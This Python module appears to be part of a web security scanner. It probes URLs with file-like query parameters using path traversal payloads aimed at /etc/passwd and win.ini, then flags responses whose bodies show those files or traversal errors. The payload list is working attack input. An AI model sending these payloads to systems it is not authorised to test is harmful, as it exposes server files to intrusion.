"""Path traversal active probe."""

from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache
from src.recon.common import normalize_url

from ._confidence import probe_confidence, probe_severity
from ._patterns import (
    BOOT_INI_RE,
    ETC_PASSWD_RE,
    PATH_TRAVERSAL_ERROR_RE,
    WIN_INI_RE,
)


def path_traversal_active_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 12,
) -> list[dict[str, Any]]:
    """Test file-related parameters with path traversal sequences.

    Sends payloads like ../, ..%2f, ..%252f, ....// to parameters that look
    like they reference file paths. Checks responses for file system errors,
    /etc/passwd content, boot.ini, win.ini content.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of path traversal findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    file_param_names = {
        "file",
        "path",
        "dir",
        "page",
        "include",
        "load",
        "doc",
        "document",
        "folder",
        "root",
        "img",
        "image",
        "style",
        "template",
        "view",
        "filepath",
        "filename",
        "pathname",
        "directory",
        "src",
        "source",
        "asset",
        "media",
        "icon",
        "logo",
        "css",
        "js",
        "layout",
    }

    traversal_payloads = [
        ("dot_dot_slash", "../../etc/passwd"),
        ("encoded_slash", "..%2f..%2fetc%2fpasswd"),
        ("double_encoded", "..%252f..%252fetc%252fpasswd"),
        ("dot_dot_dot_slash", "....//....//etc/passwd"),
        ("backslash", "..\\..\\windows\\win.ini"),
        ("encoded_backslash", "..%5c..%5cwindows%5cwin.ini"),
        ("null_byte", "../../etc/passwd%00"),
        ("traversal_simple", "../../../etc/passwd"),
    ]

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        parsed = urlparse(url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not query_pairs:
            continue

        file_params = [
            (i, k, v) for i, (k, v) in enumerate(query_pairs) if k.lower() in file_param_names
        ]
        if not file_params:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for idx, param_name, _param_value in file_params:
            if len(url_probes) >= 2:
                break
            for payload_name, payload_value in traversal_payloads:
                updated = list(query_pairs)
                updated[idx] = (param_name, payload_value)
                test_url = normalize_url(
                    urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                )

                response = response_cache.request(
                    test_url,
                    headers={"Cache-Control": "no-cache", "X-Traversal-Probe": "1"},
                )
                if not response:
                    continue

                body = str(response.get("body_text", "") or "")[:8000]
                status = int(response.get("status_code") or 0)

                issues_for_hit: list[str] = []

                if ETC_PASSWD_RE.search(body):
                    issues_for_hit.append("path_traversal_etc_passwd_reflection")
                elif BOOT_INI_RE.search(body):
                    issues_for_hit.append("path_traversal_win_ini_reflection")
                elif WIN_INI_RE.search(body):
                    issues_for_hit.append("path_traversal_win_ini_reflection")
                elif PATH_TRAVERSAL_ERROR_RE.search(body):
                    issues_for_hit.append("path_traversal_error_pattern")

                if issues_for_hit:
                    url_issues.extend(issues_for_hit)
                    url_probes.append(
                        {
                            "parameter": param_name,
                            "payload": payload_value,
                            "payload_type": payload_name,
                            "status_code": status,
                            "issues": issues_for_hit,
                        }
                    )
                    break

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
